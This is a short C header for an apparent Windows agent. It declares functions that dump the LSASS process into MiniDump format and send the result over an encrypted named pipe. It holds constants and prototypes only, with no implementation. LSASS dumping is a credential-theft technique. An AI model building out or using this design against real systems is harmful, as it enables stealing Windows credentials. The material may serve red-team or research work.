#ifndef AGENT_H
#define AGENT_H

#include <windows.h>
#include "ntdefs.h"

/* MiniDump format constants */
#define MDMP_SIGNATURE 0x504D444D
#define MDMP_VERSION   0xA793

/* Stream types */
#define STREAM_SYSTEM_INFO   7
#define STREAM_MODULE_LIST   4
#define STREAM_MEMORY64_LIST 9

/* Pipe communication */
HANDLE open_named_pipe(const wchar_t *pipe_name);
void init_pipe_cipher(const wchar_t *key);
BOOL write_pipe(HANDLE pipe, const void *data, DWORD size);
void close_pipe(HANDLE pipe);

/* LSASS dump */
BOOL dump_lsass(DWORD pid, HANDLE pipe);
BOOL spawn_lsass_child(DWORD pid, HANDLE pipe, const wchar_t *output_name);

#endif /* AGENT_H */
